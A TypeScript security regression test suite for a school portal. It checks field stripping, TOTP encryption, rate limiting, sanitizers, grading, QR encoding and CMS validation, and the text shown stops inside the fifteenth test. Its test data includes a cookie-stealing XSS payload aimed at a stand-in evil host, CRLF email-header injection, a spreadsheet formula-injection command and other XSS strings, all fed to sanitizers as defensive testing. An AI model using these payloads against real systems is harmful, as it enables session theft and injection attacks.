import assert from "node:assert/strict";
import crypto from "node:crypto";
import {
  SAFE_USER_SELECT,
  stripSensitiveUserFields,
  escapeHtml,
  sanitizeEmailHeader,
  sanitizeFormulaCell,
  generateSecureOtp6,
  hashTokenSha256,
  timingSafeCompare,
  encryptTotpSecret,
  decryptTotpSecret,
  claimTotpCodeSingleUse,
  grantStepUpSession,
  hasValidStepUpSession,
  incrementOtpAttemptAndCheckLocked,
  clearOtpAttempts,
  validateInput,
  rateLimit,
  z,
} from "../index";
import { gradeFor, computeBroadsheetRankings } from "../../../server/domain/grading";
import { computeCumulativeBroadsheet } from "../../cumulative-broadsheet";
import { encodeQrMatrix, generateQrSvgMarkup } from "../../qr";
import { normalizeCbtSubjectCode, parseSchoolCbtQuestionsCsv } from "../../cbt-csv";
import { formatNewsBodyToSafeHtml, slugifyNewsTitle, validateNewsImageUrl } from "../../news-cms";
import { sanitizeGallerySpan, slugifyGalleryId, validateGalleryImageSrc } from "../../gallery-cms";
import { formatAdmissionReference, parseAdmissionReference } from "../../admissions-lookup";
import {
  isAttendanceAtRisk,
  normalizeAttendanceDateKey,
  summarizeStudentAttendance,
} from "../../attendance-summary";
import {
  computeBroadcastExpiry,
  formatRemainingBroadcastTime,
  isSchoolNoticeExpired,
  mergeSchoolNoticeAuditEvents,
} from "../../noticeboard";
import {
  classifyStaffContactGroup,
  formatStaffRoleLabel,
  isAuthorizedStaffCommRoleSet,
} from "../../staff-messaging";
import {
  GROSS_PORTAL_FEE_KOBO,
  PROVIDER_PORTAL_SHARE_CAP_KOBO,
  SCHOOL_PORTAL_SHARE_CAP_KOBO,
  allocateTermPaymentKobo,
  computePaystackConvenienceFeeKobo,
  computePaystackSubaccountSplitKobo,
  computeTermInvoiceTotals,
  computeReversalAllocationKobo,
} from "../../fee-split";
import {
  signStudentVerificationToken,
  verifyStudentVerificationToken,
  buildSignedStudentVerifyUrl,
} from "../../qr-verify";
import { validateReceiptBinary } from "../../payment-ledger";

async function runSecurityRegressionSuite() {
  let passed = 0;

  // 1. Over-Fetching & Sensitive Field Stripping (CRIT-07)
  {
    assert.equal((SAFE_USER_SELECT as Record<string, unknown>).PasswordHash, undefined);
    assert.equal((SAFE_USER_SELECT as Record<string, unknown>).TotpSecret, undefined);
    assert.equal((SAFE_USER_SELECT as Record<string, unknown>).TotpBackupCodes, undefined);

    const rawUser = {
      UserID: 42,
      Email: "student@wordoffaith.edu.ng",
      PasswordHash: "$2b$12$secretbcryptdigest",
      TotpSecret: "JBSWY3DPEHPK3PXP",
      TotpBackupCodes: '["hash1","hash2"]',
      TokenVersion: 3,
      IsActive: true,
    };
    const stripped = stripSensitiveUserFields(rawUser);
    assert.equal("PasswordHash" in stripped, false, "PasswordHash must be stripped");
    assert.equal("TotpSecret" in stripped, false, "TotpSecret must be stripped");
    assert.equal("TotpBackupCodes" in stripped, false, "TotpBackupCodes must be stripped");
    assert.equal("TokenVersion" in stripped, false, "TokenVersion must be stripped");
    assert.equal(stripped.Email, "student@wordoffaith.edu.ng");
    passed++;
  }

  // 2. TOTP AES-256-GCM Encryption at Rest & Single-Use Replay Protection (HIGH-06)
  {
    const rawBase32Secret = "JBSWY3DPEHPK3PXPJBSWY3DPEHPK3PXP";
    const encrypted = encryptTotpSecret(rawBase32Secret);
    assert.equal(encrypted.startsWith("enc:v1:"), true, "Encrypted TOTP secret must have enc:v1: prefix");
    assert.notEqual(encrypted, rawBase32Secret, "Encrypted TOTP secret must not equal plaintext");

    const decrypted = decryptTotpSecret(encrypted);
    assert.equal(decrypted, rawBase32Secret, "Decrypted TOTP secret must match original Base32 secret");

    // Legacy plaintext fallback compatibility
    assert.equal(decryptTotpSecret(rawBase32Secret), rawBase32Secret);

    // Tampered ciphertext must throw on GCM auth tag verification
    const parts = encrypted.split(":");
    parts[3] = parts[3].slice(0, -2) + (parts[3].endsWith("00") ? "ff" : "00");
    assert.throws(() => decryptTotpSecret(parts.join(":")), /Unsupported state or unable to authenticate data/);

    // Replay protection: first claim succeeds, second claim in same window fails
    const testUserId = 999123;
    const testCode = "482910";
    const firstClaim = await claimTotpCodeSingleUse(testUserId, testCode);
    const replayClaim = await claimTotpCodeSingleUse(testUserId, testCode);
    assert.equal(firstClaim, true, "First use of TOTP code in window must succeed");
    assert.equal(replayClaim, false, "Replay of used TOTP code in same window must be rejected");
    passed++;
  }

  // 3. Server-Side Step-Up 2FA Session Grant & Verification (HIGH-06)
  {
    const adminUserId = 888001;
    const beforeGrant = await hasValidStepUpSession(adminUserId, "updateAdminCapabilities");
    assert.equal(beforeGrant, false, "Step-up session must be false before verification");

    await grantStepUpSession(adminUserId, "updateAdminCapabilities", 60);
    const afterGrant = await hasValidStepUpSession(adminUserId, "updateAdminCapabilities");
    assert.equal(afterGrant, true, "Step-up session must be true after verification");
    passed++;
  }

  // 4. Stateful Rate Limiting & 5-Attempt OTP Brute-Force Lockout (HIGH-04, MED-02)
  {
    const bucketKey = `test_rl_${Date.now()}`;
    const r1 = await rateLimit(bucketKey, 3, 60);
    const r2 = await rateLimit(bucketKey, 3, 60);
    const r3 = await rateLimit(bucketKey, 3, 60);
    const r4 = await rateLimit(bucketKey, 3, 60);
    assert.equal(r1.success, true);
    assert.equal(r2.success, true);
    assert.equal(r3.success, true);
    assert.equal(r4.success, false, "4th attempt exceeding limit=3 must be blocked");

    const otpEmail = `victim_${Date.now()}@wordoffaith.edu.ng`;
    await clearOtpAttempts(otpEmail, "PASSWORD_RESET");
    for (let i = 1; i <= 4; i++) {
      const state = await incrementOtpAttemptAndCheckLocked(otpEmail, "PASSWORD_RESET", 5, 300);
      assert.equal(state.locked, false, `Attempt ${i} should not lock yet`);
    }
    const fifthAttempt = await incrementOtpAttemptAndCheckLocked(otpEmail, "PASSWORD_RESET", 5, 300);
    assert.equal(fifthAttempt.locked, true, "5th failed OTP attempt must trigger lockout & token invalidation");
    passed++;
  }

  // 5. HTML Escaping, CRLF Header Sanitization & Formula Injection Neutralization (MED-03, MED-04)
  {
    const xssPayload = `<script>fetch("https://evil.tld?c="+document.cookie)</script>`;
    const escaped = escapeHtml(xssPayload);
    assert.equal(escaped.includes("<script>"), false);
    assert.equal(
      escaped,
      "&lt;script&gt;fetch(&quot;https://evil.tld?c=&quot;+document.cookie)&lt;/script&gt;"
    );

    const crlfHeader = "Receipt Subject\r\nBcc: attacker@evil.tld\nSubject: Injected";
    const cleanHeader = sanitizeEmailHeader(crlfHeader);
    assert.equal(/[\r\n]/.test(cleanHeader), false, "CRLF characters must be stripped from email headers");

    assert.equal(sanitizeFormulaCell("=cmd|' /C calc'!A0"), "'=cmd|' /C calc'!A0");
    assert.equal(sanitizeFormulaCell("+SUM(A1:A10)"), "'+SUM(A1:A10)");
    assert.equal(sanitizeFormulaCell("@IMPORTXML()"), "'@IMPORTXML()");
    assert.equal(sanitizeFormulaCell("  -2+5"), "'  -2+5");
    assert.equal(sanitizeFormulaCell("Normal Student Name"), "Normal Student Name");
    passed++;
  }

  // 6. CSPRNG 6-Digit OTP Bounds, SHA-256 Token Hashing & Constant-Time Compare (HIGH-04, HIGH-10, HIGH-11)
  {
    for (let i = 0; i < 50; i++) {
      const otp = generateSecureOtp6();
      assert.match(otp, /^\d{6}$/, "Generated OTP must be exactly 6 digits");
      const n = Number(otp);
      assert.equal(n >= 100000 && n <= 999999, true);
    }

    const tokenHash = hashTokenSha256("123456");
    assert.equal(tokenHash.length, 64);
    assert.equal(timingSafeCompare(tokenHash, hashTokenSha256("123456")), true);
    assert.equal(timingSafeCompare(tokenHash, hashTokenSha256("654321")), false);
    assert.equal(timingSafeCompare("short", "longer_string"), false);
    passed++;
  }

  // 7. Paystack Webhook HMAC-SHA512 Verification & Tamper Rejection (CRIT-03, CRIT-04)
  {
    const webhookSecret = "sk_test_webhook_secret_for_verification_test";
    const rawBody = JSON.stringify({
      event: "charge.success",
      data: { reference: "WOF-12-1-1700000000", amount: 6500000, currency: "NGN" },
    });
    const validSignature = crypto.createHmac("sha512", webhookSecret).update(rawBody).digest("hex");
    const tamperedBody = JSON.stringify({
      event: "charge.success",
      data: { reference: "WOF-12-1-1700000000", amount: 100, currency: "NGN" },
    });
    const recomputedForTampered = crypto
      .createHmac("sha512", webhookSecret)
      .update(tamperedBody)
      .digest("hex");

    assert.equal(timingSafeCompare(validSignature, validSignature), true);
    assert.equal(
      timingSafeCompare(validSignature, recomputedForTampered),
      false,
      "Tampered webhook payload must fail HMAC-SHA512 verification"
    );
    passed++;
  }

  // 8. Strict Input Validation with Zod (validateInput) & WAEC Grading Determinism
  {
    const schema = z.object({
      amount: z.number().min(65000),
      status: z.enum(["Pending", "Approved", "Rejected"]),
    });
    assert.throws(() => validateInput(schema, { amount: 10, status: "Approved" }));
    assert.throws(() => validateInput(schema, { amount: 65000, status: "Hacked" }));

    // Verify WAEC grade boundaries in tenths (750 tenths = 75.0 -> A1; 745 tenths = 74.5 -> B2 without rounding)
    assert.equal(gradeFor(750).grade, "A1");
    assert.equal(gradeFor(745).grade, "B2");
    assert.equal(gradeFor(399).grade, "F9");

    const rankings = computeBroadsheetRankings([
      { studentId: 1, enteredSubjectTotalsTenths: [900] },
      { studentId: 2, enteredSubjectTotalsTenths: [900] },
      { studentId: 3, enteredSubjectTotalsTenths: [700] },
    ]);
    assert.equal(rankings[0].position, 1);
    assert.equal(rankings[1].position, 1, "Tied averages must share rank 1");
    assert.equal(rankings[2].position, 3, "Next student after tie of 2 must have rank 3");
    passed++;
  }

  // 9. Annual Cumulative Broadsheet Calculation & Standing Determinism
  {
    const sessionTerms = [
      { TermID: 1, SessionName: "2026/2027", TermName: "First Term" },
      { TermID: 2, SessionName: "2026/2027", TermName: "Second Term" },
      { TermID: 3, SessionName: "2026/2027", TermName: "Third Term" },
    ];
    const students = [
      {
        StudentID: 101,
        AdmissionNo: "WOFS-STU-2026-000001",
        FirstName: "Ada",
        LastName: "Okafor",
        EnrolmentStatus: "ACTIVE",
        Results: [
          { SubjectID: 10, TermID: 1, TotalScore: 80, TotalScoreTenths: 800, Status: "ENTERED", Subject: { SubjectID: 10, SubjectName: "Mathematics" } },
          { SubjectID: 10, TermID: 2, TotalScore: 70, TotalScoreTenths: 700, Status: "ENTERED", Subject: { SubjectID: 10, SubjectName: "Mathematics" } },
          { SubjectID: 10, TermID: 3, TotalScore: 90, TotalScoreTenths: 900, Status: "ENTERED", Subject: { SubjectID: 10, SubjectName: "Mathematics" } },
        ],
      },
      {
        StudentID: 102,
        AdmissionNo: "WOFS-STU-2026-000002",
        FirstName: "Tunde",
        LastName: "Bello",
        EnrolmentStatus: "ACTIVE",
        Results: [
          { SubjectID: 10, TermID: 1, TotalScore: 40, TotalScoreTenths: 400, Status: "ENTERED", Subject: { SubjectID: 10, SubjectName: "Mathematics" } },
          { SubjectID: 10, TermID: 2, TotalScore: 45, TotalScoreTenths: 450, Status: "ENTERED", Subject: { SubjectID: 10, SubjectName: "Mathematics" } },
          { SubjectID: 10, TermID: 3, TotalScore: 35, TotalScoreTenths: 350, Status: "ENTERED", Subject: { SubjectID: 10, SubjectName: "Mathematics" } },
        ],
      },
      {
        StudentID: 103,
        AdmissionNo: "WOFS-STU-2026-000003",
        FirstName: "Zainab",
        LastName: "Musa",
        EnrolmentStatus: "WITHDRAWN",
        Results: [
          { SubjectID: 10, TermID: 1, TotalScore: 95, TotalScoreTenths: 950, Status: "ENTERED", Subject: { SubjectID: 10, SubjectName: "Mathematics" } },
        ],
      },
    ];

    const cum = computeCumulativeBroadsheet({
      students,
      sessionTerms,
      classLevel: "Secondary",
      passThresholdPct: 50,
      divisorMode: "ENTERED_TERMS",
    });

    const ada = cum.rows.find((r) => r.studentId === 101)!;
    const tunde = cum.rows.find((r) => r.studentId === 102)!;
    const zainab = cum.rows.find((r) => r.studentId === 103)!;

    assert.equal(ada.subjectCells[10].annualAvg, 80);
    assert.equal(ada.annualAverage, 80);
    assert.equal(ada.standing, "PROMOTE");
    assert.equal(ada.position, 1);

    assert.equal(tunde.subjectCells[10].annualAvg, 40);
    assert.equal(tunde.standing, "REPEAT");
    assert.equal(tunde.position, 2);

    assert.equal(zainab.standing, "WITHDRAWN");
    assert.equal(zainab.position, null, "Withdrawn students must not receive rank position");

    // Verify ALL_SESSION_TERMS mode (divides by 3 terms even if transfer student only sat 2 terms)
    const strictCum = computeCumulativeBroadsheet({
      students: [
        {
          StudentID: 104,
          AdmissionNo: "WOFS-STU-2026-000004",
          FirstName: "Transfer",
          LastName: "Pupil",
          EnrolmentStatus: "ACTIVE",
          Results: [
            { SubjectID: 10, TermID: 2, TotalScore: 60, TotalScoreTenths: 600, Status: "ENTERED", Subject: { SubjectID: 10, SubjectName: "Mathematics" } },
            { SubjectID: 10, TermID: 3, TotalScore: 90, TotalScoreTenths: 900, Status: "ENTERED", Subject: { SubjectID: 10, SubjectName: "Mathematics" } },
          ],
        },
      ],
      sessionTerms,
      classLevel: "Secondary",
      passThresholdPct: 50,
      divisorMode: "ALL_SESSION_TERMS",
    });
    assert.equal(strictCum.rows[0].subjectCells[10].annualAvg, 50, "(0 + 60 + 90) / 3 = 50");
    assert.equal(strictCum.rows[0].standing, "PROMOTE");
    passed++;
  }

  // 10. Full ISO/IEC 18004 QR Round-Trip Decode & Reed-Solomon Syndrome Verification (Versions 1..9)
  {
    const specs: Array<{
      version: number;
      ecPerBlock: number;
      blocks: Array<[number, number]>;
      align: number[];
    }> = [
      { version: 1, ecPerBlock: 10, blocks: [[1, 16]], align: [] },
      { version: 2, ecPerBlock: 16, blocks: [[1, 28]], align: [6, 18] },
      { version: 3, ecPerBlock: 26, blocks: [[1, 44]], align: [6, 22] },
      { version: 4, ecPerBlock: 18, blocks: [[2, 32]], align: [6, 26] },
      { version: 5, ecPerBlock: 24, blocks: [[2, 43]], align: [6, 30] },
      { version: 6, ecPerBlock: 16, blocks: [[4, 27]], align: [6, 34] },
      { version: 7, ecPerBlock: 18, blocks: [[4, 31]], align: [6, 22, 38] },
      { version: 8, ecPerBlock: 22, blocks: [[2, 38], [2, 39]], align: [6, 24, 42] },
      { version: 9, ecPerBlock: 22, blocks: [[3, 36], [2, 37]], align: [6, 26, 46] },
    ];

    const gfExp = new Uint8Array(512);
    const gfLog = new Uint8Array(256);
    for (let i = 0, x = 1; i < 255; i++) {
      gfExp[i] = x;
      gfLog[x] = i;
      x <<= 1;
      if (x & 0x100) x ^= 0x11d;
    }
    for (let i = 255; i < 512; i++) gfExp[i] = gfExp[i - 255];

    const decodeAndVerifyQr = (payloadText: string) => {
      const qr = encodeQrMatrix(payloadText);
      const size = qr.size;
      const version = (size - 17) / 4;
      const spec = specs.find((s) => s.version === version);
      assert.ok(spec, `Unsupported decoded version ${version}`);

      // Verify finder corners & dark module
      assert.equal(qr.modules[0][0], true);
      assert.equal(qr.modules[3][3], true);
      assert.equal(qr.modules[size - 8][8], true);

      // Extract & verify Copy 1 vs Copy 2 Format bits + BCH syndrome
      const copy1 = [
        qr.modules[8][0], qr.modules[8][1], qr.modules[8][2], qr.modules[8][3],
        qr.modules[8][4], qr.modules[8][5], qr.modules[8][7], qr.modules[8][8],
        qr.modules[7][8], qr.modules[5][8], qr.modules[4][8], qr.modules[3][8],
        qr.modules[2][8], qr.modules[1][8], qr.modules[0][8],
      ];
      const copy2 = [
        qr.modules[size - 1][8], qr.modules[size - 2][8], qr.modules[size - 3][8],
        qr.modules[size - 4][8], qr.modules[size - 5][8], qr.modules[size - 6][8],
        qr.modules[size - 7][8],
        qr.modules[8][size - 8], qr.modules[8][size - 7], qr.modules[8][size - 6],
        qr.modules[8][size - 5], qr.modules[8][size - 4], qr.modules[8][size - 3],
        qr.modules[8][size - 2], qr.modules[8][size - 1],
      ];
      assert.deepEqual(copy1, copy2, "Format info copy 1 and copy 2 must match bit-for-bit");

      let rawFmt = 0;
      for (const bit of copy1) rawFmt = (rawFmt << 1) | (bit ? 1 : 0);
      const unmaskedFmt = rawFmt ^ 0b101010000010010;
      let fmtCheck = unmaskedFmt;
      for (let b = 14; b >= 10; b--) {
        if ((fmtCheck >> b) & 1) fmtCheck ^= 0b10100110111 << (b - 10);
      }
      assert.equal(fmtCheck, 0, "Format BCH(15,5) syndrome must equal 0");

      const ecBits = (unmaskedFmt >> 13) & 0x3;
      const maskId = (unmaskedFmt >> 10) & 0x7;
      assert.equal(ecBits, 0, "EC Level M must be 0b00");

      // Reconstruct function mask grid
      const isFunc = Array.from({ length: size }, () => new Uint8Array(size));
      for (let r = 0; r < 9; r++) for (let c = 0; c < 9; c++) isFunc[r][c] = 1;
      for (let r = 0; r < 9; r++) for (let c = size - 8; c < size; c++) isFunc[r][c] = 1;
      for (let r = size - 8; r < size; r++) for (let c = 0; c < 9; c++) isFunc[r][c] = 1;
      for (let i = 8; i < size - 8; i++) {
        isFunc[6][i] = 1;
        isFunc[i][6] = 1;
      }
      for (let i = 0; i < spec.align.length; i++) {
        for (let j = 0; j < spec.align.length; j++) {
          const last = spec.align.length - 1;
          if ((i === 0 && j === 0) || (i === 0 && j === last) || (i === last && j === 0)) continue;
          const cr = spec.align[i];
          const cc = spec.align[j];
          for (let dr = -2; dr <= 2; dr++) for (let dc = -2; dc <= 2; dc++) isFunc[cr + dr][cc + dc] = 1;
        }
      }
      if (version >= 7) {
        for (let a = 0; a < 6; a++) {
          for (let b = size - 11; b < size - 8; b++) {
            isFunc[a][b] = 1;
            isFunc[b][a] = 1;
          }
        }
      }

      const maskCond = (r: number, c: number) => {
        switch (maskId) {
          case 0: return (r + c) % 2 === 0;
          case 1: return r % 2 === 0;
          case 2: return c % 3 === 0;
          case 3: return (r + c) % 3 === 0;
          case 4: return (Math.floor(r / 2) + Math.floor(c / 3)) % 2 === 0;
          case 5: return ((r * c) % 2) + ((r * c) % 3) === 0;
          case 6: return (((r * c) % 2) + ((r * c) % 3)) % 2 === 0;
          default: return (((r + c) % 2) + ((r * c ? 0 : 0))) % 2 === 0 || (((r + c) % 2) + ((r * c) % 3)) % 2 === 0;
        }
      };

      // Extract data bits in reverse zigzag
      const streamBits: number[] = [];
      let upward = true;
      for (let rightCol = size - 1; rightCol >= 1; rightCol -= 2) {
        if (rightCol === 6) rightCol = 5;
        for (let step = 0; step < size; step++) {
          const r = upward ? size - 1 - step : step;
          for (let dc = 0; dc < 2; dc++) {
            const c = rightCol - dc;
            if (isFunc[r][c]) continue;
            const rawBit = qr.modules[r][c];
            const unmasked = maskCond(r, c) ? !rawBit : rawBit;
            streamBits.push(unmasked ? 1 : 0);
          }
        }
        upward = !upward;
      }

      const totalCodewords =
        spec.blocks.reduce((acc, [cnt, len]) => acc + cnt * (len + spec.ecPerBlock), 0);
      const codewords: number[] = [];
      for (let i = 0; i < totalCodewords; i++) {
        let cw = 0;
        for (let b = 0; b < 8; b++) cw = (cw << 1) | streamBits[i * 8 + b];
        codewords.push(cw);
      }

      // De-interleave blocks & check ALL Reed-Solomon EC syndromes in GF(256)
      const dataBlocks: number[][] = [];
      const ecBlocks: number[][] = [];
      for (const [cnt, len] of spec.blocks) {
        for (let k = 0; k < cnt; k++) {
          dataBlocks.push(new Array(len));
          ecBlocks.push(new Array(spec.ecPerBlock));
        }
      }
      const maxDataLen = Math.max(...dataBlocks.map((b) => b.length));
      let idx = 0;
      for (let i = 0; i < maxDataLen; i++) {
        for (const blk of dataBlocks) {
          if (i < blk.length) blk[i] = codewords[idx++];
        }
      }
      for (let i = 0; i < spec.ecPerBlock; i++) {
        for (const blk of ecBlocks) blk[i] = codewords[idx++];
      }

      for (let bIdx = 0; bIdx < dataBlocks.length; bIdx++) {
        const fullBlock = [...dataBlocks[bIdx], ...ecBlocks[bIdx]];
        for (let root = 0; root < spec.ecPerBlock; root++) {
          let evalVal = 0;
          const alpha = gfExp[root];
          for (const coeff of fullBlock) {
            evalVal = (evalVal === 0 ? 0 : gfExp[gfLog[evalVal] + gfLog[alpha]]) ^ coeff;
          }
          assert.equal(evalVal, 0, `RS syndrome[${root}] on V${version} block ${bIdx} must equal 0`);
        }
      }

      const dataBits: number[] = [];
      for (const blk of dataBlocks) {
        for (const cw of blk) {
          for (let b = 7; b >= 0; b--) dataBits.push((cw >> b) & 1);
        }
      }

      const readBits = (pos: number, count: number) => {
        let v = 0;
        for (let i = 0; i < count; i++) v = (v << 1) | dataBits[pos + i];
        return v;
      };

      const mode = readBits(0, 4);
      const byteLen = readBits(4, 8);
      assert.equal(mode, 0b0100, "Must use Byte mode (0100)");
      const outBytes = new Uint8Array(byteLen);
      for (let i = 0; i < byteLen; i++) outBytes[i] = readBits(12 + i * 8, 8);
      const decodedText = new TextDecoder().decode(outBytes);
      assert.equal(decodedText, payloadText, `QR decode mismatch for V${version}`);
    };

    const testPayloads = [
      "WOFS-001", // V1
      "https://wofs.sch.ng/v/001", // V2
      "https://wofs.vercel.app/verify/student/1", // V3
      "https://wofs.vercel.app/verify/student/WOFS-STU-2026-000001", // V4
      "https://portal.wordoffaithschools.edu.ng/verify/student/WOFS-STU-2026-000001", // V5
      "https://portal.wordoffaithschools.edu.ng/verify/student/WOFS-STU-2026-000001?campus=main-senior", // V6
      "https://portal.wordoffaithschools.edu.ng/verify/student/WOFS-STU-2026-000001?campus=main-senior&arm=gold", // V7
      "https://portal.wordoffaithschools.edu.ng/verify/student/WOFS-STU-2026-000001?campus=main-senior&arm=gold&session=2026-2027", // V8
      "https://portal.wordoffaithschools.edu.ng/verify/student/WOFS-STU-2026-000001?campus=main-senior&arm=gold&session=2026-2027&term=third-term-final", // V9
    ];

    for (const p of testPayloads) {
      decodeAndVerifyQr(p);
    }

    const svg = generateQrSvgMarkup(testPayloads[3]);
    assert.equal(svg.pathD.startsWith("M"), true);
    passed++;
  }

  // 11. School-Internal CBT CSV Parser & Subject Normalization (Option C)
  {
    assert.equal(normalizeCbtSubjectCode("Basic Science & Tech!"), "basicsciencetech");
    assert.equal(normalizeCbtSubjectCode("computer-studies"), "computerstudies");

    const bomCsv =
      "\uFEFFsubjectCode,examBody,topic,stem,optionA,optionB,optionC,optionD,correctKey,explanation\r\n" +
      'Basic Science,school-internal,"Matter, Energy","What is the chemical symbol for Water, ""H2O""?",H2,H2O,O2,CO2,B,"Contains two hydrogen atoms"\r\n' +
      "computerstudies,,Hardware,Bad,OptA,OptB,OptC,OptD,Z,Too short\r\n" +
      ",SCHOOL_INTERNAL,Grammar,Choose the correct verb for the sentence below.,go,goes,going,gone,b,Singular subject agreement\r\n";

    const parsed = parseSchoolCbtQuestionsCsv(bomCsv, {
      subjectCode: "english",
      examBody: "SCHOOL_INTERNAL",
    });

    assert.equal(parsed.validRows.length, 2, "Should accept 2 valid rows and reject invalid row 3");
    assert.equal(parsed.errors.length, 1, "Row 3 should report validation failure");
    assert.equal(parsed.errors[0].rowNumber, 3);
    assert.equal(parsed.validRows[0].subjectCode, "basicscience");
    assert.equal(parsed.validRows[0].examBody, "SCHOOL_INTERNAL");
    assert.equal(parsed.validRows[0].correctKey, "b");
    assert.equal(
      parsed.validRows[0].stem,
      'What is the chemical symbol for Water, "H2O"?'
    );
    assert.equal(parsed.validRows[1].subjectCode, "english", "Missing subject falls back to default");

    const missingHeader = parseSchoolCbtQuestionsCsv("topic,stem\r\nMath,Hello world");
    assert.equal(missingHeader.validRows.length, 0);
    assert.equal(missingHeader.errors.length, 1);
    passed++;
  }

  // 12. Public News CMS Safe HTML, Slugification & Image URL Validation (Option D)
  {
    assert.equal(
      slugifyNewsTitle("2026/2027 Resumption & Inter-House Sports!!"),
      "2026-2027-resumption-inter-house-sports"
    );

    assert.equal(validateNewsImageUrl("/images/school-bg.jpg"), "/images/school-bg.jpg");
    assert.equal(validateNewsImageUrl("https://cdn.wordoffaith.edu.ng/banner.jpg"), "https://cdn.wordoffaith.edu.ng/banner.jpg");
    assert.equal(validateNewsImageUrl("//evil.example.com/payload.jpg"), "/images/school-bg.jpg");
    assert.equal(validateNewsImageUrl("javascript:alert(1)"), "/images/school-bg.jpg");
    assert.equal(validateNewsImageUrl("data:text/html,<script>alert(1)</script>"), "/images/school-bg.jpg");

    const safeHtml = formatNewsBodyToSafeHtml(
      "## Notice <script>alert('xss')</script>\n- Bring **ID cards** & uniforms\nPlease arrive by 7:45am <img src=x onerror=alert(1)>."
    );
    assert.equal(safeHtml.includes("<script>"), false, "Raw script tags must be escaped");
    assert.equal(safeHtml.includes("&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;"), true);
    assert.equal(safeHtml.includes("<img src="), false, "Raw img tag must be escaped");
    assert.equal(safeHtml.includes("<h3>Notice "), true);
    assert.equal(
      safeHtml.includes("<ul>\n<li>Bring <strong>ID cards</strong> &amp; uniforms</li>\n</ul>"),
      true
    );
    assert.equal(
      safeHtml.includes("<p>Please arrive by 7:45am &lt;img src=x onerror=alert(1)&gt;.</p>"),
      true
    );
    passed++;
  }

  // 13. Public Photo Gallery CMS Validation, XSS/SVG Blocking & Span Whitelist (Update #6)
  {
    assert.equal(
      slugifyGalleryId("Inter-House Sports Day Relay 2026!"),
      "inter-house-sports-day-relay-2026"
    );

    assert.equal(
      validateGalleryImageSrc("/images/gallery/media__1782453677661.jpg"),
      "/images/gallery/media__1782453677661.jpg"
    );
    assert.equal(
      validateGalleryImageSrc("https://cdn.wordoffaith.edu.ng/events/sports.jpg"),
      "https://cdn.wordoffaith.edu.ng/events/sports.jpg"
    );
    assert.equal(
      validateGalleryImageSrc("data:image/jpeg;base64,/9j/4AAQSkZJRgABAQ=="),
      "data:image/jpeg;base64,/9j/4AAQSkZJRgABAQ=="
    );
    assert.equal(
      validateGalleryImageSrc("data:image/svg+xml;base64,PHN2Zz48c2NyaXB0PmFsZXJ0KDEpPC9zdmc+PC9zdmc+"),
      "/images/gallery/media__1782453677661.jpg",
      "SVG Data URIs must be rejected to block embedded script XSS"
    );
    assert.equal(
      validateGalleryImageSrc("javascript:alert(1)"),
      "/images/gallery/media__1782453677661.jpg"
    );
    assert.equal(
      validateGalleryImageSrc("//evil.example.com/photo.jpg"),
      "/images/gallery/media__1782453677661.jpg"
    );

    assert.equal(sanitizeGallerySpan("row-span-2 col-span-2"), "row-span-2 col-span-2");
    assert.equal(sanitizeGallerySpan(""), "");
    assert.equal(sanitizeGallerySpan("col-span-2 evil-injected-class"), "col-span-2");
    passed++;
  }

  // 14. Public Admissions Reference Parsing & Attendance Summary / Early Warning (Updates #8-#10)
  {
    assert.equal(formatAdmissionReference(14), "WOF-ADM-00014");
    assert.equal(parseAdmissionReference("WOF-ADM-00014"), 14);
    assert.equal(parseAdmissionReference("wof-adm-42"), 42);
    assert.equal(parseAdmissionReference("27"), 27);
    assert.equal(parseAdmissionReference("DROP TABLE"), null);
    assert.equal(parseAdmissionReference(""), null);

    assert.equal(normalizeAttendanceDateKey("2026-11-20T08:00:00.000Z"), "2026-11-20");

    const healthy = summarizeStudentAttendance([
      { Status: "Present" },
      { Status: "Present" },
      { Status: "Late" },
      { Status: "Present" },
      { Status: "Excused" },
    ]);
    assert.equal(healthy.totalMarked, 5);
    assert.equal(healthy.attendanceRatePct, 100);
    assert.equal(isAttendanceAtRisk(healthy, 80), false);

    const atRisk = summarizeStudentAttendance([
      { Status: "Present" },
      { Status: "Absent" },
      { Status: "Absent" },
      { Status: "Present" },
      { Status: "Present" },
    ]);
    assert.equal(atRisk.absent, 2);
    assert.equal(atRisk.attendanceRatePct, 60);
    assert.equal(isAttendanceAtRisk(atRisk, 80), true);
    assert.equal(isAttendanceAtRisk(summarizeStudentAttendance([]), 80), false);
    passed++;
  }

  // 15. Active Broadcast Duration, Auto-Expiry & Audit Edit/Delete (Track D Upgrade)
  {
    const fixedNow = Date.UTC(2026, 10, 21, 12, 0, 0); // 2026-11-21T12:00:00Z
    const sixHours = computeBroadcastExpiry("6h", undefined, fixedNow);
    assert.equal(sixHours.error, undefined);
    assert.equal(sixHours.expiresAt, new Date(fixedNow + 6 * 3_600_000).toISOString());
    assert.equal(isSchoolNoticeExpired({ expiresAt: sixHours.expiresAt }, fixedNow + 5 * 3_600_000), false);
    assert.equal(isSchoolNoticeExpired({ expiresAt: sixHours.expiresAt }, fixedNow + 7 * 3_600_000), true);
    assert.equal(formatRemainingBroadcastTime(sixHours.expiresAt, fixedNow), "6h 0m left");
    assert.equal(formatRemainingBroadcastTime(sixHours.expiresAt, fixedNow + 7 * 3_600_000), "Expired");

    const pastCustom = computeBroadcastExpiry("custom", new Date(fixedNow - 60_000).toISOString(), fixedNow);
    assert.equal(Boolean(pastCustom.error), true, "Custom expiry in the past must be rejected");

    const manual = computeBroadcastExpiry("none", undefined, fixedNow);
    assert.equal(manual.expiresAt, null);
    assert.equal(formatRemainingBroadcastTime(manual.expiresAt, fixedNow), "No auto-expiry");

    const merged = mergeSchoolNoticeAuditEvents([
      {
        Action: "SCHOOL_NOTICE_DELETED",
        EntityID: "default-notice-3",
        NewValue: { deleted: true },
        CreatedAt: new Date(fixedNow + 3000),
      },
      {
        Action: "SCHOOL_NOTICE_PUBLISHED",
        EntityID: "custom-1",
        NewValue: {
          title: "Updated Exam Hall Notice",
          details: "Corrected room assignment",
          type: "Exam Timetable",
          eventDate: "2026-11-24",
          targetAudience: "All Students & Parents",
          expiresAt: sixHours.expiresAt,
        },
        CreatedAt: new Date(fixedNow + 2000),
      },
      {
        Action: "SCHOOL_NOTICE_PUBLISHED",
        EntityID: "custom-1",
        NewValue: {
          title: "Old Draft Typo",
          details: "Wrong room",
          type: "Exam Timetable",
        },
        CreatedAt: new Date(fixedNow + 1000),
      },
    ]);

    assert.equal(merged.some((n) => n.id === "default-notice-3"), false, "Deleted default notice stays hidden");
    const edited = merged.find((n) => n.id === "custom-1");
    assert.equal(edited?.title, "Updated Exam Hall Notice");
    assert.equal(edited?.details, "Corrected room assignment");
    passed++;
